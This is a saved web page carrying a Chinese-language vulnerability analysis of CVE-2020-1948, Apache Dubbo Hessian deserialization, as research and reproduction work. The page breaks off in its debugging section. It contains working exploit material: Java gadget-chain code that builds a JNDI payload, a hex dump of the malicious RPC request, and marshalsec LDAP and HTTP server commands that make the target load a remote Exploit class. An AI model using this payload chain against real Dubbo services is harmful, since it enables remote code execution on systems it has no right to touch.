<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0,minimum-scale=1.0">
            <title>CVE-2020-1948 Apache Dubbo Hessian 反序列化漏洞分析 - 安全客，安全资讯平台</title>
                <meta name="description" content="漏洞存在于 Apache Dubbo默认使用的反序列化工具 hessian 中，攻击者可能会通过发送恶意 RPC 请求来触发漏洞，这类 RPC 请求中通常会带有无法识别的服务名或方法名，以及一些恶意的参数负载。"/>
                <meta name="keywords"
              content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议"/>
        <meta name="csrf-token" content="de3xODU22EG28AkXtVPIzeAWd9RSjM1Mna36BODh">
    <link rel="stylesheet" href="https://static.anquanke.com/bootstrap/css/bootstrap.min.css?v1.2">
    <link rel="stylesheet" href="https://www.anquanke.com/css/style.css?v1.0.28">
    <link rel="shortcut icon" href="https://p0.ssl.qhimg.com/t01b2a1553a7bc927cb.ico?v=1.2"/>
    <link href="https://lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script src="https://lib.baomitu.com/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://static.anquanke.com/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://lib.baomitu.com/axios/0.17.1/axios.min.js"></script>
    <script src="https://lib.baomitu.com/purl/2.3.1/purl.min.js"></script>
    <script src="https://lib.baomitu.com/handlebars.js/4.0.11/handlebars.min.js"></script>
    <script src="https://lib.baomitu.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
    <script src="https://www.anquanke.com/js/site.min.js?v1.0.5"></script>
    <script src="https://www.anquanke.com/js/xss.min.js?v1.0.0"></script>
    <script src="https://lib.baomitu.com/jquery.sticky/1.0.4/jquery.sticky.min.js"></script>
    <script type="text/javascript">
        if (document.location.protocol !== "https:") {
            location.href = location.href.replace(/^http:/, "https:");
        }
        if (document.location.host !== "www.anquanke.com") {
            location.href = location.href.replace(document.location.host, 'www.anquanke.com');
        }
    </script>
</head><body data-spy="scroll" data-target="#article-index" data-offset="30">
<!--头部导航 -->
<header>
    <div class="navbar navbar-dark bg-dark header-navbar fixed-top" style="z-index:100;">

        <div class="container d-flex justify-content-between">
            <nav class="navbar navbar-expand-lg navbar-dark bg-dark header-navbar">
                <a href="https://www.anquanke.com" class="navbar-brand">
                    <img style="height: 48.69px;margin-top: 4px;"
                         src="https://p0.ssl.qhimg.com/t01dcf171a151ec5398.png">
                </a>
                <div class="collapse navbar-collapse" style="margin-left:35px;">
                    <!--导航菜单-->
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item active header-menu-item">
                            <a class="nav-link" href="/">首页</a>
                        </li>
                        <li class="nav-item dropdown header-menu-item header-nav-item-post">
                            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button"
                               data-toggle="dropdown" aria-haspopup="true"
                               aria-expanded="false">
                                文章
                            </a>
                            <div class="header-pop-window-wrapper">
                                <div class="header-pop-window">
                                    <div style="background-color:white;width: 100%;padding-bottom: 15px;">
                                        <div class="header-pop-menu-container">
                                            <div class="row">
                                                <div class="col col-8">
                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>文章分类
                                                    </div>
                                                    <div style="line-height:1.8;font-weight:normal;">
                                                        <a href="/knowledge">安全知识</a><span class="seprator">|</span>
                                                        <a href="/news">安全资讯</a><span class="seprator">|</span>
                                                        <a href="/activity">安全活动</a><span class="seprator">|</span>
                                                        <a href="/tool">安全工具</a><span class="seprator">|</span><br/>
                                                        <a href="/job">招聘信息</a>
                                                    </div>
                                                </div>
                                                <div class="col col-6">
                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>内容精选
                                                    </div>
                                                    <div style="line-height:1.8;font-weight:normal;">
                                                        <a href="/week-list">360网络安全周报</a><span
                                                                class="seprator">|</span>
                                                        <a href="/discovery"
                                                           style="color:red !important;font-weight:bold">安全客季刊</a>
                                                        <span
                                                                class="seprator">|</span>
                                                        <br/>
                                                        <a href="/subject-list">专题列表</a>
                                                        <span
                                                                class="seprator">|</span>
                                                        <a href="/opensource">开源项目精选</a>
                                                        
                                                                
                                                        
                                                    </div>
                                                </div>
                                                <div class="col col-10">
                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>热门标签
                                                    </div>
                                                    <div style="line-height:1.8;font-weight:normal;">
                                                                                                                    <a href="/tag/漏洞分析">
                                                                <nobr>漏洞分析</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/每日安全热点">
                                                                <nobr>每日安全热点</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/网络安全热点">
                                                                <nobr>网络安全热点</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/恶意软件">
                                                                <nobr>恶意软件</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/活动">
                                                                <nobr>活动</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/CTF">
                                                                <nobr>CTF</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/Web安全">
                                                                <nobr>Web安全</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/安全漏洞">
                                                                <nobr>安全漏洞</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/漏洞">
                                                                <nobr>漏洞</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/安全研究">
                                                                <nobr>安全研究</nobr>
                                                            </a><span class="seprator">|</span>                                                     </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </li>
                        <li class="nav-item header-menu-item" style="position: relative">
                            <a class="nav-link" href="/vul">漏洞</a>
                        </li>
                        <li class="nav-item header-menu-item">
                            <a class="nav-link" href="/src">SRC导航</a>
                        </li>
                        <li class="nav-item header-menu-item">
                            <a class="nav-link" href="/discovery">内容精选</a>
                        </li>
                    </ul>
                    <!--搜索-->

                </div>
            </nav>
            <div class="hide-in-mobile-device">
                <div style="float: left;height: 42px;line-height: 42px;margin-top: 11px;">
                    <fieldset>
                        <div class="search-form" style="height: 42px;background-color: #1da29b;border: 2px #008c88 solid;display: block;">
                            <input class="search-input" placeholder="输入关键词搜索" name="s" id="search" value="" style="height:32px;padding-left: 12px;" type="text">
                            <i onclick="if($('#search').val())window.location.href = '/search?s=' + $('#search').val();"
                               class="fa fa-search" style="font-size:20px;color:#1dada7"></i>
                        </div>
                    </fieldset>
                </div>
                <div style="float: left;height: 64px;line-height: 64px;">
                    <a href="/app"> <img src="https://p0.ssl.qhimg.com/t01452b56d48d4d6d9a.png"
                                         style="height: 28px;margin-right: 3px;margin-left: 6px;"/><span
                                style="color: white;font-size: 12px;margin-right: 12px;">APP</span></a>
                    <!--投稿按钮-->
                </div>
                <div style="float: left;height: 64px;line-height: 64px;margin-right: 20px;">
                    <button onclick="if(getLocalUserInfo()){if(getLocalUserInfo().isLogin)window.location.href='/contribute/new';else window.location.href='/login';}"
                            type="button" class="btn btn-primary btn-md" style="margin-right:8px;">
                            <span style="font-size:14px">
                                <i class="fa fa-pencil-square-o" style="margin-right:4px;"></i> 我要投稿</span>
                    </button>
                </div>
                <div id="login-button" class="hide-in-mobile-device" style="display:none;float: left">
                <span style="font-size:14px;">
                        <a href="/login">登录</a>|
                        <a href="/register">注册</a>
                    </span>
                </div>
                <div id="navigation-user-info" class="hide-in-mobile-device" style="display:none;float: left;">
                    <a style="position: relative;">
                        <img class="avatar" id="user-avatar" style="width:40px;height:40px;">
                        <div style="background-color: red;height: 6px;width: 6px;border-radius: 50%;position: absolute;right: -10px;top:-6px;display: none;" class="unread_count"></div>
                    </a>

                    <div class="user-opition-menu">
                        <ul>
                            <li>
                                <a id="my-home-page" href="#">
                                    <i style="margin-right: 6px; color: rgb(29, 173, 167);"
                                       class="fa fa-user-o"></i>个人主页</a>
                            </li>
                            <li style="vertical-align: middle;display: table-cell;">
                                <a id="my-home-page" href="/setting?p=message" style="vertical-align: middle;">
                                    <i style="margin-right: 6px; color: rgb(29, 173, 167);"
                                       class="fa fa-bell-o"></i>我的消息</a><span class="badge badge-pill badge-danger unread_count" id="unread_count"
                                                                              style="font-size: 11px;margin-left: 6px;vertical-align: middle;display: none"></span>
                            </li>
                            <li>
                                <a href="/setting">
                                    <i style="margin-right: 6px; color: rgb(29, 173, 167);"
                                       class="fa fa-cog"></i>资料设置</a>
                            </li>
                            <li onclick="logout();">
                                <i style="margin-right: 8px; color: red;margin-left: 8px;" class="fa fa-power-off"></i>退出登录
                            </li>
                        </ul>
                    </div>

                </div>
            </div>

            <div class="show-in-mobile-device"
                 onclick="switchMobileMenu()"
                 style="width: 40px;height: 60px;line-height: 60px; cursor: pointer;font-size: 28px;color: white">
                <i class="fa fa-bars"></i>
            </div>
        </div>
    </div>
</header>
<style>
    #mobile-menu {
        position: fixed;
        width: 100%;
        top: 60px;
        left: 0;
        background: #1dada7;
        height: 0;
        z-index: 50;
        overflow: hidden;
        box-shadow: 0 0 3rem #444;
    }

    #mobile-menu ul {
        padding: 0px;
    }

    #mobile-menu li {
        color: rgba(255, 255, 255, 0.7);
        font-size: 0.9rem;
        margin-top: 20px;
        padding-left: 12px;
    }
</style>
<div id="mobile-menu" class="show-in-mobile-device">
    <ul>
        <li class="mobile-menu-item" data-url="/">首页</li>
        <li class="mobile-menu-item" data-url="/knowledge">安全知识</li>
        <li class="mobile-menu-item" data-url="/news">安全资讯</li>
        <li class="mobile-menu-item" data-url="/job">招聘信息</li>
        <li class="mobile-menu-item" data-url="/activity">安全活动</li>
        <li class="mobile-menu-item" data-url="/app">APP下载</li>
    </ul>
</div>
<script>
    var menuExpand = false;

    function switchMobileMenu() {
        if (!menuExpand) {
            $("#mobile-menu").animate({"height": "265px"});
            menuExpand = true;
        }
        else {
            $("#mobile-menu").animate({"height": "0px"});
            menuExpand = false;
        }
    }

    $(".mobile-menu-item").click(function () {
        window.location.href = $(this).data("url");
    });
</script>

<script>
    var status;

    function updateLoginStatus(status) {
        if (status.isLogin) {
            $("#navigation-user-info").show();
            $("#user-avatar").attr("src", getResizedQihooImg(status.user.avatar, 90, 90));
            $("#my-home-page").attr("href", "/member/" + status.user.id);
            $(".comment-login").show();
            $(".comment-login .avatar").attr("data-original", getResizedQihooImg(status.user.avatar, 90, 90));
            $(".comment-login .avatar").lazyload();
            $(".comment-login a").attr("href", "/member/" + status.user.id);
            $(".comment-login .nickname").text(status.user.nickname);
            $(".comment-not-login").hide();
        }
        else {
            $("#login-button").show();
            $(".comment-login").hide();
            $(".comment-not-login").show();
        }
    }

    function getMessageCount() {
        axios.post(api("msg/user/unread")).then(function (res) {
            if(res.data.code==0)
            {
                if(res.data.unread_count>0)
                {
                    $(".unread_count").show();
                    $("#unread_count").text(res.data.unread_count);
                }

            }
            console.log(res.data);
        });
    }
    getMessageCount();

    function logout() {
        axios.post(api("user/logout")).then(function (res) {
            deleteUserInfo();
            window.location.href = "/";
        });
    }

    $(".header-nav-item-post").hover(
        function () {
            $(".header-pop-window-wrapper").css("visibility", "visible");
            $(".header-pop-window").css("transform", "translate(0,0)");
        },
        function () {
            $(".header-pop-window").css("transform", "translate(0,-100%)");
            $(".header-pop-window-wrapper").css("visibility", "hidden");
        });
    if (!getLocalUserInfo()) {
        axios.get(api("user/status")).then(function (res) {
            if (res.status === 200) {
                saveLocalUserInfo(res.data);
                updateLoginStatus(getLocalUserInfo());
            }
        })
    }
    else {
        updateLoginStatus(getLocalUserInfo());
    }
</script>
<!--头部导航end--><style>
    .highslide-viewport-size {
        position: fixed;
        width: 100%;
        height: 100%;
        left: 0;
        top: 0;
    }
</style>
<script src="https://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
<script src="https://static.anquanke.com/highslide/highslide.js"></script>
<link rel="stylesheet" type="text/css" href="https://static.anquanke.com/highslide/css/style.css"/>
<link href="https://lib.baomitu.com/malihu-custom-scrollbar-plugin/3.1.5/jquery.mCustomScrollbar.min.css" rel="stylesheet">
<script src="https://lib.baomitu.com/malihu-custom-scrollbar-plugin/3.1.5/jquery.mCustomScrollbar.min.js"></script>
<script src="https://lib.baomitu.com/layer/3.1.1/layer.js"></script><main role="main" style="min-height:1000px;padding-top:76px;">
    <div class="container d-flex justify-content-between">
        <div class="row" style="width:100%">
            <div class="col col-xs-24 col-sm-24 col-md-24 col-lg-18">
                <div class="common-left-content-container article-detail"
                     style="background-color:white;overflow:hidden;">
                    <h1>
                        CVE-2020-1948 Apache Dubbo Hessian 反序列化漏洞分析
                    </h1>
                    <p class="article-top-info" style="margin-bottom: 10px;position:relative;">
                            <span>
                                阅读量 &nbsp;&nbsp;
                                <b>116345</b>
                            </span>
                        <span style="color:#cccccc;margin-left:20px;margin-right:20px;">|</span>
                        <span>
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                    </span>
                    <div class="hide-in-mobile-device"
                         style="padding:6px 12px;; position:absolute;top:90px; right:0px;line-height:40px;overflow:hidden;width:300px;height:40px;">
                        <div style="background-color:#f2f2f2;transform:skew(30deg);height:45px;width:100%;top:0;right:-30;position:absolute;z-index:0"></div>
                        <div style="height:40px;width:100%;top:-3px;right:-35px;position:absolute;z-index:0;padding-top: 2px;">
                            <div class="bdsharebuttonbox" data-tag="share_1"
                                 style="display:table-cell;vertical-align:midlle;">
                                        <span style="
                                                    font-weight: 800;
                                                    color: #999999;
                                                ">分享到：</span>
                                <img data-cmd="qzone" alt="QQ空间"
                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t014ba42aad7714178d.png"/>
                                <img data-cmd="tsina" alt="新浪微博"
                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01f0d8694dda79069d.png"/>
                                <img data-cmd="weixin" alt="微信"
                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png"/>
                                <img data-cmd="sqq" alt="QQ"
                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t010d95bee6ba3edf60.png"/>
                                <img data-cmd="fbook" alt="facebook"
                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01a5e75c16cffcb0ba.png"/>
                                <img data-cmd="twi" alt="twitter"
                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01fc30c819f51e9cff.png"/>
                            </div>
                        </div>
                    </div>
                    </p>
                    <time class="article-date">发布时间：2020-06-28 16:30:12</time>
                                                            <div class="article-content">
                        <html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
<body>
<p><img class="alignnone size-full wp-image-209288 aligncenter" alt="" width="720" height="378" data-original="https://p3.ssl.qhimg.com/t0164d67734a841c580.jpg"></p>
<p> </p>
<h2 name="h2-0" id="h2-0">0x00 背景</h2>
<p><img class="size-full wp-image-209252 aligncenter" alt="" width="775" height="369" data-original="https://p3.ssl.qhimg.com/t01fe5525299b17c761.png"></p>
<p>Apache Dubbo 是一款高性能Java RPC框架。漏洞存在于 Apache Dubbo默认使用的反序列化工具 hessian 中，攻击者可能会通过发送恶意 RPC 请求来触发漏洞，这类 RPC 请求中通常会带有无法识别的服务名或方法名，以及一些恶意的参数负载。当恶意参数被反序列化时，达到代码执行的目的。</p>
<p> </p>
<h2 name="h2-1" id="h2-1">0x1 影响范围</h2>
<p>2.7.0 &lt;= Dubbo Version &lt;= 2.7.6<br>
2.6.0 &lt;= Dubbo Version &lt;= 2.6.7<br>
Dubbo 所有 2.5.x 版本（官方团队目前已不支持）</p>
<p> </p>
<h2 name="h2-2" id="h2-2">0x02 协议介绍</h2>
<h3 name="h3-3" id="h3-3">
<a class="reference-link" name="0x1%20dubbo"></a>0x1 dubbo</h3>
<p>dubbo 支持多种序列化方式并且序列化是和协议相对应的。比如：Dubbo支持dubbo、rmi、hessian、http、webservice、thrift、redis等多种协议。<br>
这里介绍的dubbo漏洞里的dubbo指的是RPC框架。dubbo同时是阿里尚未开发成熟的高效 java 序列化实现，阿里不建议在生产环境使用它。</p>
<h3 name="h3-4" id="h3-4">
<a class="reference-link" name="0x2%20Hessian"></a>0x2 Hessian</h3>
<blockquote><p>引用：hessian 是一种跨语言的高效二进制序列化方式。但这里实际不是原生的 hessian2 序列化，而是阿里修改过的 hessian lite，Hessian是二进制的web service协议，官方对Java、Flash/Flex、Python、C++、.NET C#等多种语言都进行了实现。Hessian和Axis、XFire都能实现web service方式的远程方法调用，区别是Hessian是二进制协议，Axis、XFire则是SOAP协议，所以从性能上说Hessian远优于后两者，并且Hessian的JAVA使用方法非常简单。它使用Java语言接口定义了远程对象，集合了序列化/反序列化和RMI功能。</p></blockquote>
<p>Hessian [1] 协议用于集成 Hessian 的服务，Hessian 底层采用 Http 通讯，采用 Servlet 暴露服务，Dubbo 缺省内嵌 Jetty 作为服务器实现。</p>
<p>Dubbo 的 Hessian 协议可以和原生 Hessian 服务互操作，即：</p>
<ul>
<li>提供者用 Dubbo 的 Hessian 协议暴露服务，消费者直接用标准 Hessian 接口调用</li>
<li>或者提供方用标准 Hessian 暴露服务，消费方用 Dubbo 的 Hessian 协议调用。</li>
</ul>
<p>一个简单的Hessian序列化使用方法</p>
<pre><code class="lang-java">import com.caucho.hessian.io.Hessian2Output;
import java.io.ByteArrayOutputStream;
import java.io.Serializable;
class User implements Serializable {
public static void main(String[]args){
//        System.out.println("hehe");
        }
}
public class HessianTest {
    public static void main(String[] args) throws Exception {
        Object o=new User();
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(os);
        output.writeObject(o);
        output.close();
        System.out.println(os.toString());
    }
}
</code></pre>
<h3 name="h3-5" id="h3-5">
<a class="reference-link" name="0x3%20%E5%8D%8F%E8%AE%AE%E5%85%B3%E7%B3%BB"></a>0x3 协议关系</h3>
<p>介绍到这有的同学可能就迷了，Dubbo和序列化到底是怎么个关系，可以从以下几点考虑：</p>
<ol>
<li>Dubbo 从大的层面上将是RPC框架，负责封装RPC调用，支持很多RPC协议</li>
<li>RPC协议包括了dubbo、rmi、hession、webservice、http、redis、rest、thrift、memcached、jsonrpc等</li>
<li>Java中的序列化有Java原生序列化、Hessian 序列化、Json序列化、dubbo 序列化</li>
</ol>
<p><img class="size-full wp-image-209253 aligncenter" alt="" width="800" height="329" data-original="https://p0.ssl.qhimg.com/t01dd60f99ea19aec96.jpg"></p>
<p>通过上面这个关系图，可以看出我们这里研究的是<strong>Dubbo协议</strong>中<strong>Hessian反序列化</strong>漏洞。关系理清楚了下面看一看漏洞复现和分析。</p>
<p> </p>
<h2 name="h2-6" id="h2-6">0x03 环境搭建</h2>
<h3 name="h3-7" id="h3-7">
<a class="reference-link" name="0x1%20%E6%90%AD%E5%BB%BAdubbo-spring-boot"></a>0x1 搭建dubbo-spring-boot</h3>
<p>利用dubbo Demo进行环境搭建 <a href="https://github.com/apache/dubbo-spring-boot-project">https://github.com/apache/dubbo-spring-boot-project</a><br>
注意选择2.7.6 或以下版本，下载过后添加必要的漏洞利用jar包</p>
<h3 name="h3-8" id="h3-8">
<a class="reference-link" name="0x2%20%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE"></a>0x2 添加漏洞利用链</h3>
<p>下载 2.7.5 版本，用 IDEA 打开 dubbo-spring-boot-samples 文件夹，在provider-sample文件夹下的 pom 里添加：</p>
<p><img class="alignnone size-full wp-image-209255" alt="" width="525" height="207" data-original="https://p4.ssl.qhimg.com/t0164d3f7fac1a1b198.png"></p>
<pre><code class="lang-xml">        &lt;dependency&gt;
                 &lt;groupId&gt;com.rometools&lt;/groupId&gt;
                 &lt;artifactId&gt;rome&lt;/artifactId&gt;
                 &lt;version&gt;1.7.0&lt;/version&gt;
         &lt;/dependency&gt;
</code></pre>
<p> </p>
<h2 name="h2-9" id="h2-9">0x04 漏洞原理与利用</h2>
<h3 name="h3-10" id="h3-10">
<a class="reference-link" name="0x1%20%E5%8E%9F%E7%90%86"></a>0x1 原理</h3>
<p>主要利用Dubbo协议调用其他RPC协议时会涉及到数据的序列化和反序列化操作。如果没有做检查校验很有可能成功反序列化攻击者精心构造的恶意类，利用java调用链使服务端去加载远程的Class文件，通过在Class文件的构造函数或者静态代码块中插入恶意语句从而达到远程代码执行的攻击效果。</p>
<h3 name="h3-11" id="h3-11">
<a class="reference-link" name="0x2%20%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"></a>0x2 利用链分析</h3>
<p>在marshalsec工具中，提供了对于Hessian反序列化可利用的几条链：<br><a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a><br><a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true">https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true</a></p>
<p><img class="alignnone size-full wp-image-209256 aligncenter" alt="" width="672" height="759" data-original="https://p0.ssl.qhimg.com/t014bcc581f9848919a.jpg"></p>
<p><img class="size-full wp-image-209257 aligncenter" alt="" width="800" height="123" data-original="https://p2.ssl.qhimg.com/t017c4373460840c6ab.jpg"></p>
<ul>
<li>SpringPartiallyComparableAdvisorHolder</li>
<li>SpringAbstractBeanFactoryPointcutAdvisor</li>
<li>Rome</li>
<li>XBean</li>
</ul>
<p>我们这次利用Rome构造JNDI注入利用链。关于JNDI在之前调试Fastjson漏洞中有简单说明。<br>
本次主要是利用下面攻击链，攻击链触发过程会在漏洞调试时说明。</p>
<pre><code class="lang-java">- HashMap.put
- HashMap.putVal
- HashMap.hash
- EqualsBean.hashCode
- EqualsBean.beanHashCode
- ToStringBean.toString
- JdbcRowSetImpl.getDatabaseMetaData
- JdbcRowSetImpl.connect
- Context.lookup
</code></pre>
<p>分析攻击链构造过程，这里参考了 原作者的利用链 &lt;a href=”https://www.mail-archive.com/<a href="mailto:dev@dubbo.apache.org">dev@dubbo.apache.org</a>/msg06544.html””&gt;https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html ，作者以及写的很完整了，我这里搬过来整合了一下。利用了marshalsec jar包，</p>
<pre><code class="lang-java">import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import marshalsec.Hessian;
import marshalsec.gadgets.JDKUtil;
import java.io.ByteArrayOutputStream;

public class GadgetsTestHessian {
    private static Object getPayload() throws Exception {
        String jndiUrl = "ldap://127.0.0.1:8087/Exploit";;//最后触发JdbcRowSetImpl.getDatabaseMetaData-&gt;JdbcRowSetImpl.connect-&gt;Context.lookup
        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class,
                JDKUtil.makeJNDIRowSet(jndiUrl));//EqualsBean.beanHashCode调用ToStringBean.toString
        EqualsBean root = new EqualsBean(ToStringBean.class,item);//HashMap.hash调用EqualsBean.beanHashCode
        return JDKUtil.makeMap(root,root);//触发HashMap.put-&gt;HashMap.putVal-&gt;HashMap.hash
    }

    public static void main(String[] args) throws Exception {
        Object o=getPayload();
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(os);
        output.writeObject(o);
        output.close();
        System.out.println(os.toString());
    }
}
</code></pre>
<p><img class="size-full wp-image-209258 aligncenter" alt="" width="800" height="153" data-original="https://p3.ssl.qhimg.com/t011eb2105ebe6d4ea5.jpg"></p>
<p>这个是Hessian 序列化之后的数据，想要利用起来还要封装一层Dubbo协议，我们采用dubbo-spring-boot项目中的DubboAutoConfigurationConsumerBootstrap类进行构造。这里注意一点如果使用Dubbo的消费者和提供者协议Dubbo会自动Hessian序列化传输的对象，所以下面构造Payload只需将利用编写好之后调用Dubbo协议调用即可。</p>
<h3 name="h3-12" id="h3-12">
<a class="reference-link" name="0x3%20%E6%9E%84%E9%80%A0Payload"></a>0x3 构造Payload</h3>
<p>在DemoService.java中添加commonTest 接口函数</p>
<p><img class="alignnone size-full wp-image-209259 aligncenter" alt="" width="493" height="350" data-original="https://p3.ssl.qhimg.com/t0144f203be78108a7c.png"></p>
<p>在DubboAutoConfigurationConsumerBootstrap中编写消费者调用函数</p>
<p><img class="alignnone size-full wp-image-209260 aligncenter" alt="" width="663" height="537" data-original="https://p3.ssl.qhimg.com/t0188bcdb1bd03806ed.png"></p>
<p>在DubboAutoConfigurationProviderBootstrap中编写服务者提供的服务，触发连不在这里所以可以随便写。</p>
<p><img class="alignnone size-full wp-image-209261 aligncenter" alt="" width="800" height="349" data-original="https://p0.ssl.qhimg.com/t01b936ab6277c084fc.jpg"></p>
<p>在Intellij idea中启动provider服务者，然后运行consumer消费者，利用wireshark获取Apache Dubbo 反序列化payload</p>
<p><img class="size-full wp-image-209262 aligncenter" alt="" width="800" height="225" data-original="https://p1.ssl.qhimg.com/t0190efe1019cc8cc74.jpg"></p>
<pre><code>dabbc2000000000000000000000003b705322e302e3230366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f5365727669636505312e302e300a636f6d6d6f6e54657374124c6a6176612f6c616e672f4f626a6563743b48433027636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e457175616c734265616e92036f626a096265616e436c61737360433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92036f626a096265616e436c61737361431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cac06706172616d73096c697374656e657273036d61700a6368617253747265616d0b617363696953747265616d0d756e69636f646553747265616d0c62696e61727953747265616d0f7374724d61746368436f6c756d6e730d694d61746368436f6c756d6e73057265734d4406726f77734d4402727302707304636f6e6e09666574636853697a650866657463684469720969736f6c6174696f6e1065736361706550726f63657373696e6708726561644f6e6c790b636f6e63757272656e63790c6d61784669656c6453697a65076d6178526f77730c717565727954696d656f75740b73686f7744656c657465640a726f77536574547970650a64617461536f757263650355524c07636f6d6d616e64624d136a6176612e7574696c2e486173687461626c655a4e4e4e4e4e4e56106a6176612e7574696c2e566563746f729a03666f6f4e4e4e4e4e4e4e4e4e56919a8f8f8f8f8f8f8f8f8f8f4e4e4e4e4e90cbe8925454cbf090909046cbec1d6c6461703a2f2f3132372e302e302e313a383038372f4578706c6f69744e4e430f6a6176612e6c616e672e436c61737391046e616d65631d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c633029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e5191519151915a48047061746830366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f536572766963651272656d6f74652e6170706c69636174696f6e3024647562626f2d6175746f2d636f6e6669677572652d636f6e73756d65722d73616d706c6509696e7465726661636530366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f536572766963650776657273696f6e05312e302e305a
</code></pre>
<h3 name="h3-13" id="h3-13">
<a class="reference-link" name="0x4%20%E5%BC%80%E5%90%AFLDAP%E6%9C%8D%E5%8A%A1"></a>0x4 开启LDAP服务</h3>
<pre><code class="lang-bash">╰─➤  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8089/#Exploit 8087
</code></pre>
<p>Exploit.java 代码在很多github都能获取 <a href="https://github.com/ctlyz123/fastjson_vul">https://github.com/ctlyz123/fastjson_vul</a><br>
然后在Exploit.class 目录中开启HTTPServer</p>
<pre><code class="lang-bash">python -m SimpleHTTPServer 8089
</code></pre>
<h3 name="h3-14" id="h3-14">
<a class="reference-link" name="0x5%20%E7%BC%96%E5%86%99python%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"></a>0x5 编写python攻击脚本</h3>
<p><img class="size-full wp-image-209263 aligncenter" alt="" width="800" height="391" data-original="https://p5.ssl.qhimg.com/t016f045e48ed2b4e2c.jpg"></p>
<p>接下来调试整个漏洞触发链</p>
<p> </p>
<h2 name="h2-15" id="h2-15">0x05 漏洞调试</h2>
<p>触发练如下图所示：</p>
<p><img class="size-full wp-image-209264 aligncenter" alt="" width="580" height="434" data-original="https://p3.ssl.qhimg.com/t01169aac2c006d641e.png"></p>
<h3 name="h3-16" id="h3-16">
<a class="reference-link" name="0x1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3"></a>0x1 反序列化入口</h3>
<p>进入到Dubbo协议的decode环节，其中inputStream是去掉Dubbo协议头的原始数据</p>
<p><img class="alignnone size-full wp-image-209265 aligncenter" alt="" width="727" height="305" data-original="https://p3.ssl.qhimg.com/t0110ec15ba7ad3dc96.png"></p>
<p>在decode函数中会逐步提取Dubbo 协议Body中的内容</p>
<p><img class="alignnone size-full wp-image-209267 aligncenter" alt="" width="781" height="274" data-original="https://p0.ssl.qhimg.com/t017f8cf2d9d39cce4d.png"></p>
<p>in 现在是Hessian2ObjectInput对象，其中包含了要反序列化的二进制内容</p>
<p><img class="alignnone size-full wp-image-209269 aligncenter" alt="" width="800" height="193" data-original="https://p5.ssl.qhimg.com/t01f045e7b8eb46c8c6.jpg"></p>
<p>在生成反序列化对象时采用的id号是2，从代码中可以看出是Hessian协议。</p>
<p><img class="size-full wp-image-209268 aligncenter" alt="" width="800" height="363" data-original="https://p2.ssl.qhimg.com/t01c712d0c78eea7d16.jpg"></p>
<h3 name="h3-17" id="h3-17">
